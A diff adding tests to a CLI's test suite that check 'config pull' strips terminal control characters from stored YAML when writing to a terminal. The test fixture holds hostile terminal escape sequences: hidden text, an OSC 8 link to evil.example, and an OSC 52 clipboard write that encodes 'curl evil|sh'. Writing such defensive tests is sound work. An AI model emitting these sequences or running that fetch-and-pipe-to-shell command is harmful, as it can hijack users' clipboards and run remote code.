@@ -223,6 +223,23 @@ describe("server strings in human lines", () => {
 });
 
 describe("telflo config pull", () => {
+  // Another member's stored YAML may hold escape sequences: concealed text, an OSC 8 link, an OSC 52 clipboard write.
+  const STORED_WITH_ESCAPES = "receivers: {}\n# \u001b[8mhidden\u001b[0m \u001b]8;;https://evil.example\u0007link\u001b]8;;\u0007 \u001b]52;c;Y3VybCBldmlsfHNo\u0007\nexporters:\n\tdebug: {}\n";
+
+  it("prints stored YAML to a terminal without its control characters, its newlines and tabs kept", async () => {
+    routes({ [`GET /configurations/${ID}`]: { json: { ...configuration(), yaml: STORED_WITH_ESCAPES } } });
+    const result = await cli(["config", "pull", ID], { stdoutTty: true });
+    expect(result.code).toBe(0);
+    expect(holdsControl(result.stdout.replaceAll("\t", ""))).toBe(false);
+    expect(result.stdout).toBe("receivers: {}\n# [8mhidden[0m ]8;;https://evil.examplelink]8;; ]52;c;Y3VybCBldmlsfHNo\nexporters:\n\tdebug: {}\n");
+  });
+
+  it("pipes stored YAML byte for byte (a file it is redirected to is the version as saved)", async () => {
+    routes({ [`GET /configurations/${ID}`]: { json: { ...configuration(), yaml: STORED_WITH_ESCAPES } } });
+    const result = await cli(["config", "pull", ID]);
+    expect(result.stdout).toBe(STORED_WITH_ESCAPES);
+  });
+
   it("prints the latest version's YAML exactly, its pin on stderr", async () => {
     routes({ [`GET /configurations/${ID}`]: { json: { ...configuration(), yaml: "receivers: {}" } } });
     const result = await cli(["config", "pull", ID]);
